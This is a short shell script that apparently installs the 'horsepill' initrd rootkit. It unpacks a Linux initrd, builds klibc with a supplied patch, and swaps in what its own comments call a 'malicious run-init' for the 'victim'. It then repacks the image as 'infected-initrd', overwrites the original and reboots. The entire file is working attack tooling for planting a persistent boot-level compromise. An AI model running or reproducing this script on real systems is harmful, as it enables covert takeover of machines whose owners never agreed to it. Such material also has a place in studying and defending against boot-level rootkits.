#!/bin/sh

# if less than two arguments supplied, display usage 
if [ $# -ne 2 ] 
then 
    echo "Usage: ${0} absolute_path_of_initrd_to_replace absolute_path_of_patch"
    exit 1
fi

# prepare the working directories in /tmp
mkdir /tmp/horsepill/
mkdir /tmp/horsepill/initrd-extracted/
cd /tmp/horsepill

# extract initrd image
unmkinitramfs $1 ./initrd-extracted

# download the source for klibc
apt-get build-dep klibc && apt-get source klibc

# build applying the patch
cd klibc-2.0.7 && quilt import $2 -f && DEB_BUILD_OPTIONS=nocheck dpkg-buildpackage -j$(nproc) -us -uc

# copy malicious run-init to victim
rm /tmp/horsepill/initrd-extracted/main/usr/bin/run-init
mv /tmp/horsepill/klibc-2.0.7/usr/kinit/run-init/shared/run-init /tmp/horsepill/initrd-extracted/main/usr/bin/run-init

# add the first microcode firmware
cd ../initrd-extracted
cd early
find . -print0 | cpio --null --create --format=newc > /tmp/horsepill/infected-initrd

# add the second microcode firmware
cd ../early2
find kernel -print0 | cpio --null --create --format=newc >> /tmp/horsepill/infected-initrd

# add the ram fs file system
cd ../main
find . | cpio --create --format=newc | lz4 -l -c >> /tmp/horsepill/infected-initrd

# replace initrd 
rm $1 && mv /tmp/horsepill/infected-initrd $1
reboot
